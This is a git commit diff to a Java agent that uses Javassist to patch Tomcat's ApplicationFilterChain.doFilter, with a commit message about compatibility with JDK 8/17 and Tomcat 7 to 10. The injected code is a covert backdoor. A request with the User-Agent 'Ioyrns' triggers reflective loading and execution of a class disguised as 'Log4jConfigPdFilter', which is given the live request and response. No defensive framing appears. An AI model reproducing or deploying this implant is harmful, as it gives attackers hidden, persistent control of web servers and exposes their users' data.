d48f6f80bb962341e960479185aee87c993cf83c
shibiao.zhou <secsan569@gmail.com>
2025-11-04 22:29:42 +0800

    兼容jdk8/jdk17/tomcat7/8/9/10版本，这些都可以正常使用，只是在tomcat9及一下会在控制台出现一些异常信息。 在tomcat9及一下版本中会出现 1、java.lang.reflect.InvocationTargetException 2、reviously initiated loading for a different type with name "javax/servlet/http/HttpSession" 在tomcat10版本中可以正常使用且不会出现任何异常情况

--- src/main/java/MyTransformer.java
+++ src/main/java/MyTransformer.java
@@ -15,43 +15,70 @@ public class MyTransformer implements ClassFileTransformer {
         }
 
         try {
-            ClassPool pool = ClassPool.getDefault();
-            pool.appendClassPath(new LoaderClassPath(loader));
+            ClassPool pool = new ClassPool(true);
+            if (loader != null) {
+                pool.appendClassPath(new LoaderClassPath(loader));
+            }
 
             CtClass cc = pool.makeClass(new ByteArrayInputStream(classFileBuffer));
             CtMethod doFilter = cc.getDeclaredMethod("doFilter");
 
             doFilter.insertBefore(
                     "{ " +
-                            "    System.out.println(\"into doFilter\");" +
-                            "    javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest)$1;" +
-                            "    javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse)$2;" +
-                            "    String ua = req.getHeader(\"User-Agent\");" +
-                            "    if (\"Ioyrns\".equalsIgnoreCase(ua)) {" +
-                            "        try {" +
-                            "            ClassLoader cl = this.getClass().getClassLoader();" +
-                            "            System.out.println(\"ApplicationFilterChain#cl = \" + cl);" +
-                            "            Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
-                            "            java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
-                            "            Object obj = m.invoke(null, new Object[]{ cl });" +
-                            "            java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
-                            "            exec.invoke(obj, new Object[]{ req, res });" +
-                            "        } catch (Throwable t) { System.out.println(\"ApplicationFilterChain exception!!!\");t.printStackTrace(); }" +
-                            "        return;" +
-                            "    }" +
-                            "}"
+                        "    System.out.println(\"[Agent] into doFilter\");" +
+                        "    Object reqObj = $1;" +
+                        "    Object resObj = $2;" +
+                        "    try {" +
+                        "        ClassLoader reqCl = reqObj.getClass().getClassLoader();" +
+                        "        Class reqCls = null;" +
+                        "        Class resCls = null;" +
+
+                        "        try {" +
+                        "            reqCls = Class.forName(\"javax.servlet.http.HttpServletRequest\", false, reqCl);" +
+                        "            resCls = Class.forName(\"javax.servlet.http.HttpServletResponse\", false, reqCl);" +
+                        "        } catch (Throwable ex) {" +
+                        "            reqCls = Class.forName(\"jakarta.servlet.http.HttpServletRequest\", false, reqCl);" +
+                        "            resCls = Class.forName(\"jakarta.servlet.http.HttpServletResponse\", false, reqCl);" +
+                        "        }" +
+
+                        "            Object req = reqObj;" +
+                        "            Object res = resObj;" +
+                        "            System.out.println(\"[Agent] ApplicationFilterChain#reqObj = \" + reqObj);" +
+
+                        "            java.lang.reflect.Method getHeader = reqObj.getClass().getMethod(\"getHeader\", new Class[]{ java.lang.String.class });" +
+                        "            String ua = (String)getHeader.invoke(reqObj, new Object[]{ \"User-Agent\" });" +
+
+                        "            System.out.println(\"[Agent] ApplicationFilterChain#reqObj2 = \" + reqObj);" +
+                        "            if (\"Ioyrns\".equalsIgnoreCase(ua)) {" +
+                        "                try {" +
+                        "                    ClassLoader cl = Thread.currentThread().getContextClassLoader();" +
+                        "                    if (cl == null) cl = this.getClass().getClassLoader();" +
+                        "                    System.out.println(\"[Agent] ApplicationFilterChain#cl = \" + cl);" +
+                        "                    Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
+                        "                    java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
+                        "                    Object obj = m.invoke(null, new Object[]{ cl });" +
+                        "                    java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
+                        "                    exec.invoke(obj, new Object[]{ req, res });" +
+                        "                } catch (Throwable t) {" +
+                        "                    System.out.println(\"[Agent] ApplicationFilterChain exception!!!\");" +
+                        "                    t.printStackTrace();" +
+                        "                }" +
+                        "                return;" +
+                        "        }" +
+                        "    } catch (Throwable e) { e.printStackTrace(); }" +
+                        "}"
             );
 
 
-            System.out.println("[+] Hooked doFilter, caching Log4jConfigPdFilter instance.");
+            System.out.println("[+] Hooked doFilter successfully (Tomcat10+/JDK17/Loader-isolation fixed).");
             byte[] bytecode = cc.toBytecode();
             cc.detach();
             return bytecode;
 
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
+            return null;
         }
 
-        return null;
     }
 }
